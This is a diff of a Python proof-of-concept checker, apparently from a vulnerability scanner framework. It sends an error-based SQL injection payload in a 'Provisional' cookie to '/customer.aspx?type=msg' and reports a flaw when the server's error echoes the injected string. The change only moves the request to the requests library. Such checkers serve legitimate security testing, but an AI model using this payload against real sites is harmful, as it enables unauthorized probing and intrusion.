@@ -34,10 +34,11 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             payload = "/customer.aspx?type=msg"
             target = '{target}'.format(target=self.target)+payload
-            cookie = "Provisional=Uid=convert(int,CHAR(104)+CHAR(101)+CHAR(110)+CHAR(116)+CHAR(97)+CHAR(105))"
-            code, head, body, errcode, final_url = hh.http('-b "%s" "%s"' % (cookie, target))
-                       
-            if code == 500 and 'hentai' in body:
+            cookie = {
+                "Cookie":"Provisional=Uid=convert(int,CHAR(104)+CHAR(101)+CHAR(110)+CHAR(116)+CHAR(97)+CHAR(105))"
+            }
+            req = requests.post(target, headers=cookie)
+            if req.status_code == 500 and 'hentai' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
